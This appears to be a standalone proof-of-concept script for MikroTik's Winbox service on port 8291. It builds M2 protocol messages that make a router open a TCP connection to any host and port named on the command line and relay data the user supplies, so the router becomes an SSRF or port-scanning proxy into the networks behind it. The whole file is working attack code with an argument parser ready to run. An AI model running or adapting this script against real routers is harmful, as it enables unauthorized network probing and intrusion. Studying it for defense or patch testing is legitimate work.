#!/usr/bin/env python3

import argparse, struct, socket, hashlib, time
from binascii import *
from codecs import decode

# Packet headers
M2_HEADER = b'\x4d\x32'
M2_EXTRA  = b'\x01\x00'

# Winbox protocol types
MT_BOOL       = 0x00
MT_BOOL_CODE  = {False: 0x00, True: 0x01}
MT_BOOL_VALUE = {0x00: False, 0x01: True}
MT_DWORD      = 0x08
MT_BYTE       = 0x09
MT_STRING     = 0x21
MT_HASH       = 0x31
MT_ARRAY      = 0x88

# Message protocol constants
MT_RECEIVER = 0xff0001
MT_SENDER = 0xff0002
MT_REPLY_EXPECTED = 0xff0005
MT_REQUEST_ID = 0xff0006
MT_COMMAND = 0xff0007

def ip2dword(addr):
	return struct.unpack("<I", socket.inet_aton(addr))[0]

def dword2ip(addr):
	return socket.inet_ntoa(struct.pack("<I", addr))

# Add M2 header and sizes to the stream (there's no check if size exceeds one 255)
def m2_header(stream):
	size = len(stream)
	return struct.pack('B', size + 4) + M2_EXTRA + struct.pack('B', size + 2) + M2_HEADER + stream

# Return an array of M2 blocks, each cointaining an array of tuples like (code, type, value)
def m2_parse(stream):
	result = []

	pointer = 0
	stream_size = len(stream)

	while pointer < stream_size:
		keywords = []

		header_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_EXTRA:
			return None
		pointer += 2
		m2_block_size = ord(stream[pointer:pointer+1])
		pointer += 1
		if stream[pointer:pointer+2] != M2_HEADER:
			print('Not a M2 block')
			return None
		if header_block_size != (m2_block_size + 2):
			print('M2 header and block sizes mismatch!')
			return None
		pointer += 2

		block_data_start = pointer

		while pointer < (block_data_start + m2_block_size - 2):
			# Configuration ID, or keyword_code, is always 3 bytes long
			try:
				keyword_code = struct.unpack('<I', stream[pointer:pointer+3] + b'\x00')[0]
			except:
				return result
			pointer += 3
			# The next is one byte keyword type
			keyword_type = ord(stream[pointer:pointer+1])
			if keyword_type in MT_BOOL_CODE:
				keyword_value = MT_BOOL_VALUE[keyword_type]
				pointer += 1
			elif keyword_type == MT_DWORD:
				pointer += 1
				keyword_value = struct.unpack('<I', stream[pointer:pointer+4])[0]
				pointer += 4
			elif keyword_type == MT_BYTE:
				pointer += 1
				keyword_value = struct.unpack('B', stream[pointer:pointer+1])[0]
				pointer += 1
			elif keyword_type == MT_STRING:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length].decode('UTF-8')
				pointer += length
			elif keyword_type == MT_HASH:
				pointer += 1
				length = ord(stream[pointer:pointer+1])
				pointer += 1
				keyword_value = stream[pointer:pointer+length]
				pointer += length
			elif keyword_type == MT_ARRAY:
				pointer += 1
				array_size = struct.unpack('<H', stream[pointer:pointer+2])[0]
				pointer += 2
				i = 0
				keyword_value = []
				while i < array_size:
					element = struct.unpack('<I', stream[pointer:pointer+4])[0]
					i += 1
					pointer += 4
					keyword_value.append(element)
			else:
				print('Unknown keyword/code')
				break
			keywords.append((keyword_code, keyword_type, keyword_value))
		result.append(keywords)
	return result

# Generate a stream for the given array of keywords, which are tuples of: (code, type, value)
def m2_bytes(keywords):
	result = b''
	for k in keywords:
		code, type, value = k

		if type == MT_BOOL:
			type = MT_BOOL_CODE[value]
			size_bytes = b''
			value_bytes = b''
		elif type == MT_DWORD:
			size_bytes = b''
			value_bytes = struct.pack('<I', value)
		elif type == MT_BYTE:
			size_bytes = b''
			value_bytes = struct.pack('B', value)
		elif type == MT_STRING:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value.encode('UTF-8')
		elif type == MT_HASH:
			size_bytes = struct.pack('B', len(value))
			value_bytes = value
		elif type == MT_ARRAY:
			size_bytes = struct.pack('<H', len(value))
			value_bytes = b''
			for element in value:
				value_bytes += struct.pack('<I', element)
		code_bytes = struct.pack('<I', code)[0:3]
		type_bytes = struct.pack('B', type)
		result += (code_bytes + type_bytes + size_bytes + value_bytes)
	return result

def mt_proxy_request(host, port, send1, recv1):
	m2 = []
	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
	m2.append((MT_COMMAND, MT_BYTE, 1))
	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
	m2.append((3, MT_DWORD, ip2dword(host)))
	m2.append((4, MT_DWORD, port))
	if send1 != '':
		m2.append((7, MT_STRING, send1))
	if recv1 != '':
		m2.append((8, MT_STRING, recv1))
	return m2_header(m2_bytes(m2))

def do(proxy_host, proxy_port, target_host, target_port, send1, recv1):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((proxy_host, int(proxy_port)))
		print('[+] Connected to %s:%s' % (proxy_host, proxy_port))
	except:
		print('[-] Cannot connect to %s:%s' % (proxy_host, proxy_port))
		s.close()
		exit()

	request = mt_proxy_request(target_host, target_port, send1, recv1)

	request_data = m2_parse(request)
	if request_data is not None:
		if DEBUG:
			print('\nM2 parsed request:')
			for block in request_data:
				for keyword in block:
					code, type, value = keyword
					print(code, type, value)

	print('>>>', hexlify(request).decode('UTF-8'), '\n')

	try:
		s.send(request)
		print('[+] Request completed')
	except:
		print('[-] Request failed')
		s.close()
		exit()

	try:
		read = s.recv(1024)
		print('[+] Response read completed')
	except:
		print('[-] Response read failed')
		s.close()
		exit()

	print('<<<', hexlify(read).decode('UTF-8'), '\n')

	read_data = m2_parse(read)
	if read_data is not None:
		if DEBUG:
			print('M2 parsed result:')
		for block in read_data:
			for keyword in block:
				code, type, value = keyword
				if code == 0xff0008 and type == MT_DWORD:
					print('ERROR: %s' % value)
				if DEBUG:
					print(code, type, value)

	s.close()

DEBUG = False
proxy_port = 8291
send = ''
receive = ''

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-X', '--proxy-host', required = True)
	parser.add_argument('-P', '--proxy-port', required = False)
	parser.add_argument('-t', '--target-host', required = True)
	parser.add_argument('-p', '--target-port', required = True)
	parser.add_argument('-s', '--send', required = False)
	parser.add_argument('-r', '--receive', required = False)
	parser.add_argument('--debug', action = 'store_true', required = False)
	args = vars(parser.parse_args())

	proxy_host = args['proxy_host']
	if args['proxy_port']:
		proxy_port = int(args['proxy_port'])
	target_host = args['target_host']
	target_port = int(args['target_port'])
	if args['send']:
		send = decode(args['send'], 'unicode_escape')
	if args['receive']:
		receive = decode(args['receive'], 'unicode_escape')

	if args['debug']:
		DEBUG = True

#	send = 'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Oops\r\nAccept: */*\r\n\r\n' % target_host
#	recv = '^HTTP/1.1 200 Ok\r\nServer: micro_httpd'

	print(repr(send), repr(receive))
	do(proxy_host, proxy_port, target_host, target_port, send, receive)
